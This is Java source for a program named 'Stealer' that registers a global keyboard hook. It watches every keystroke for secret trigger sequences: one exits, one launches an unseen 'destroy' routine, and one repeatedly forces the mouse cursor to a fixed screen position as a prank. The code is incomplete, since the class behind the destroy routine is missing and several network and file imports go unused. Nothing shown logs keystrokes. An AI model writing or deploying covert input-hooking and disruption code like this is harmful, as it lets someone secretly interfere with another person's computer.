import com.sun.org.apache.xalan.internal.xsltc.dom.SimpleResultTreeImpl;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.swing.*;
import javax.xml.crypto.Data;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.im.InputContext;
import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;

public class start{
    public static void main(String[] args) {
        Stealer stealer = new Stealer();
        GlobalScreen.addNativeKeyListener(stealer);
        stealer.start();
//        Grafon grafon = new Grafon();
    }
}

class Stealer implements NativeKeyListener {
    private String exit = "";   // shift -- caps -- shift
    private boolean forExit = false;

    private boolean forDestroy = false;   //  g -- h -- u --- enter
    private String destroy = "";
    private boolean mouseLocked = false;   //   g -- h -- u --- 1  (прикол с мышкой)  g -- h -- u --- 2  (отмена)
    private boolean isDestroying = false;

    private boolean forCancel = false;   //  space -- space -- enter
    private String cancel = "";

    private FXclass fXclass;

    public void start(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        // не работает
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        try{
            logic(nativeKeyEvent);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void logic(NativeKeyEvent nativeKeyEvent) throws IOException{
        forExit = false;
        forDestroy = false;
        forCancel = false;

        if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("shift")){
            if(exit.equalsIgnoreCase("")){
                exit += "shift";
                forExit = true;
            }
            else if(exit.equalsIgnoreCase("shiftCaps Lock")){
                System.exit(1);   // for exit shift--caps--shift
            }
        }
        else if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("Caps Lock")){
            if(exit.equalsIgnoreCase("shift")){
                exit += "Caps Lock";
                forExit = true;
            }
        }
        else if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("enter")){
            if(destroy.equalsIgnoreCase("ghu")){
                fXclass = new FXclass();
                try {
                    fXclass.start();
                    isDestroying = true;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            if(cancel.equalsIgnoreCase("spacespace") && isDestroying){
                fXclass.endThreads();
                isDestroying = false;
            }
        }
        else if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("space")){
            forCancel = true;
            cancel += "space";
        }
        else {
            String str = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
            if(!forExit){
                exit = "";
            }

            if(str.equalsIgnoreCase("g") && destroy.equalsIgnoreCase("")){
                forDestroy = true;
                destroy += "g";
            }
            if(str.equalsIgnoreCase("h") && destroy.equalsIgnoreCase("g")){
                forDestroy = true;
                destroy += "h";
            }
            if(str.equalsIgnoreCase("u") && destroy.equalsIgnoreCase("gh")){
                forDestroy = true;
                destroy += "u";
            }

            if(str.equalsIgnoreCase("1") && destroy.equalsIgnoreCase("ghu")){
                mouseLocked = false;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        GraphicsEnvironment environment = GraphicsEnvironment.getLocalGraphicsEnvironment();
                        GraphicsDevice graphicsDevice = environment.getDefaultScreenDevice();
                        try {
                            Robot robot = new Robot(graphicsDevice);
                            while(!mouseLocked){
                                robot.mouseMove(750, 500);
                                Thread.sleep(2500);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }

            if(str.equalsIgnoreCase("2") && destroy.equalsIgnoreCase("ghu")){
                mouseLocked = true;
            }

            if(!forDestroy){
                destroy = "";
            }

            if(!forCancel){
                cancel = "";
            }
        }
    }
}

class Grafon extends JFrame{
    Grafon(){
        setVisible(true);
        setSize(200,200);
    }
}






